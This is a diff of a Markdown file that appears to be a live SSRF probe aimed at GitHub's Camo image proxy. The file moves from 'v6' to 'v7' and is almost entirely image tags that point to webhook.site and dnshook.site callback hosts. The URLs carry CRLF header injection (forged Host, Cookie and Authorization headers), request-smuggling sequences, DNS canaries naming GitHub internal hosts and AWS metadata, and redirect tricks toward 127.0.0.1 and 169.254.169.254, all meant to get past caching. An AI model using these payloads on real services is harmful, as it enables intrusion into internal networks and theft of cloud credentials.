@@ -1,64 +1,51 @@
-# SSRF v6 - Fresh URLs to Bypass Camo Cache
+# SSRF v7 - Fresh Webhook Testing
 
-## Test A1: Basic Tracker
-<picture><source srcset="https://webhook.site/b45a05ce-3f7d-4a49-9e5d-5a138dde5eca/v6/fresh-tracker-abc123" media="(min-width: 1px)"><img src="https://webhook.site/b45a05ce-3f7d-4a49-9e5d-5a138dde5eca/v6/img-abc123"></picture>
+## Basic Connectivity
 
-## Test A2: CRLF Host Injection
-<picture><source srcset="https://webhook.site/b45a05ce-3f7d-4a49-9e5d-5a138dde5eca/v6/host-inject-xyz789%0d%0aHost:%20127.0.0.1" media="(min-width: 1px)"><img src="x"></picture>
+![b1](https://webhook.site/136e610f-df46-485b-b57e-d42604727ca2/b1-basic.png)
 
-## Test A3: X-Forwarded-For CRLF
-<picture><source srcset="https://webhook.site/b45a05ce-3f7d-4a49-9e5d-5a138dde5eca/v6/xff-inject-aaa111%0d%0aX-Forwarded-For:%20127.0.0.1" media="(min-width: 1px)"><img src="x"></picture>
+## CRLF Header Injection
 
-## Test A4: Double CRLF Body
-<picture><source srcset="https://webhook.site/b45a05ce-3f7d-4a49-9e5d-5a138dde5eca/v6/body-inject-bbb222%0d%0a%0d%0aGET%20/admin%20HTTP/1.1" media="(min-width: 1px)"><img src="x"></picture>
+![h1](https://webhook.site/136e610f-df46-485b-b57e-d42604727ca2/h1-host%0d%0aHost:%20internal.github.net.png)
 
-## Test A5: Connection Header
-<picture><source srcset="https://webhook.site/b45a05ce-3f7d-4a49-9e5d-5a138dde5eca/v6/conn-inject-ccc333%0d%0aConnection:%20upgrade" media="(min-width: 1px)"><img src="x"></picture>
+![h2](https://webhook.site/136e610f-df46-485b-b57e-d42604727ca2/h2-xff%0d%0aX-Forwarded-For:%2010.0.0.1.png)
 
-## Test A6: Transfer-Encoding CRLF
-<picture><source srcset="https://webhook.site/b45a05ce-3f7d-4a49-9e5d-5a138dde5eca/v6/te-inject-ddd444%0d%0aTransfer-Encoding:%20chunked" media="(min-width: 1px)"><img src="x"></picture>
+![h3](https://webhook.site/136e610f-df46-485b-b57e-d42604727ca2/h3-xfh%0d%0aX-Forwarded-Host:%20internal.png)
 
-## Test A7: DNS Canary v6
-<picture><source srcset="https://v6-callback-eee555.b45a05ce-3f7d-4a49-9e5d-5a138dde5eca.dnshook.site/test" media="(min-width: 1px)"><img src="x"></picture>
+## Double CRLF (Body Injection)
 
-## Test A8: GitHub Internal DNS v6  
-<picture><source srcset="https://github-internal-v6-fff666.b45a05ce-3f7d-4a49-9e5d-5a138dde5eca.dnshook.site/" media="(min-width: 1px)"><img src="x"></picture>
+![d1](https://webhook.site/136e610f-df46-485b-b57e-d42604727ca2/d1-body%0d%0a%0d%0aGET%20/internal%20HTTP/1.1.png)
 
-## Test A9: AWS Metadata via DNS
-<picture><source srcset="https://aws-meta-v6-ggg777.b45a05ce-3f7d-4a49-9e5d-5a138dde5eca.dnshook.site/" media="(min-width: 1px)"><img src="x"></picture>
+![d2](https://webhook.site/136e610f-df46-485b-b57e-d42604727ca2/d2-body%0d%0a%0d%0ainternal-data.png)
 
-## Test A10: X-Original-URL CRLF
-<picture><source srcset="https://webhook.site/b45a05ce-3f7d-4a49-9e5d-5a138dde5eca/v6/xorig-inject-hhh888%0d%0aX-Original-URL:%20/admin" media="(min-width: 1px)"><img src="x"></picture>
+## Request Smuggling Patterns
 
-## Test A11: Cookie CRLF
-<picture><source srcset="https://webhook.site/b45a05ce-3f7d-4a49-9e5d-5a138dde5eca/v6/cookie-inject-iii999%0d%0aCookie:%20session=admin" media="(min-width: 1px)"><img src="x"></picture>
+![s1](https://webhook.site/136e610f-df46-485b-b57e-d42604727ca2/s1-cl%0d%0aContent-Length:%200%0d%0a%0d%0aGET%20/admin.png)
 
-## Test A12: Authorization CRLF
-<picture><source srcset="https://webhook.site/b45a05ce-3f7d-4a49-9e5d-5a138dde5eca/v6/auth-inject-jjj000%0d%0aAuthorization:%20Bearer%20test-token" media="(min-width: 1px)"><img src="x"></picture>
+![s2](https://webhook.site/136e610f-df46-485b-b57e-d42604727ca2/s2-te%0d%0aTransfer-Encoding:%20chunked%0d%0a%0d%0a0.png)
 
-## Test A13: Content-Type CRLF
-<picture><source srcset="https://webhook.site/b45a05ce-3f7d-4a49-9e5d-5a138dde5eca/v6/ct-inject-kkk111%0d%0aContent-Type:%20text/html" media="(min-width: 1px)"><img src="x"></picture>
+## DNS Exfiltration
 
-## Test A14: Accept CRLF
-<picture><source srcset="https://webhook.site/b45a05ce-3f7d-4a49-9e5d-5a138dde5eca/v6/accept-inject-lll222%0d%0aAccept:%20*/*" media="(min-width: 1px)"><img src="x"></picture>
+![n1](https://v7-canary.136e610f-df46-485b-b57e-d42604727ca2.dnshook.site/n1.png)
 
-## Test A15: Content-Length Zero
-<picture><source srcset="https://webhook.site/b45a05ce-3f7d-4a49-9e5d-5a138dde5eca/v6/cl-zero-mmm333%0d%0aContent-Length:%200" media="(min-width: 1px)"><img src="x"></picture>
+![n2](https://v7-github-internal.136e610f-df46-485b-b57e-d42604727ca2.dnshook.site/n2.png)
 
-## Test A16: Newline Only (LF)
-<picture><source srcset="https://webhook.site/b45a05ce-3f7d-4a49-9e5d-5a138dde5eca/v6/lf-only-nnn444%0aHost:%20internal" media="(min-width: 1px)"><img src="x"></picture>
+## Alternative Encodings
 
-## Test A17: Carriage Return Only (CR)
-<picture><source srcset="https://webhook.site/b45a05ce-3f7d-4a49-9e5d-5a138dde5eca/v6/cr-only-ooo555%0dHost:%20internal" media="(min-width: 1px)"><img src="x"></picture>
+![e1](https://webhook.site/136e610f-df46-485b-b57e-d42604727ca2/e1-unicode%e2%80%8btest.png)
 
-## Test A18: Space Before CRLF
-<picture><source srcset="https://webhook.site/b45a05ce-3f7d-4a49-9e5d-5a138dde5eca/v6/space-crlf-ppp666%20%0d%0aEvil:%20header" media="(min-width: 1px)"><img src="x"></picture>
+![e2](https://webhook.site/136e610f-df46-485b-b57e-d42604727ca2/e2-null%00test.png)
 
-## Test A19: Tab Before CRLF
-<picture><source srcset="https://webhook.site/b45a05ce-3f7d-4a49-9e5d-5a138dde5eca/v6/tab-crlf-qqq777%09%0d%0aEvil:%20header" media="(min-width: 1px)"><img src="x"></picture>
+![e3](https://webhook.site/136e610f-df46-485b-b57e-d42604727ca2/e3-backslash%5c%5ctest.png)
 
-## Test A20: Multiple CRLF
-<picture><source srcset="https://webhook.site/b45a05ce-3f7d-4a49-9e5d-5a138dde5eca/v6/multi-crlf-rrr888%0d%0a%0d%0a%0d%0aBody" media="(min-width: 1px)"><img src="x"></picture>
+## Fragment/Query Tricks
+
+![q1](https://webhook.site/136e610f-df46-485b-b57e-d42604727ca2/q1?url=http://127.0.0.1/admin)
+
+![q2](https://webhook.site/136e610f-df46-485b-b57e-d42604727ca2/q2#@169.254.169.254)
+
+![q3](https://webhook.site/136e610f-df46-485b-b57e-d42604727ca2/q3?redirect=//internal.github.net)
 
 ---
-**v6: Fresh URLs with unique identifiers to bypass Camo caching**
+
+*v7: Fresh webhook token - 136e610f-df46-485b-b57e-d42604727ca2*
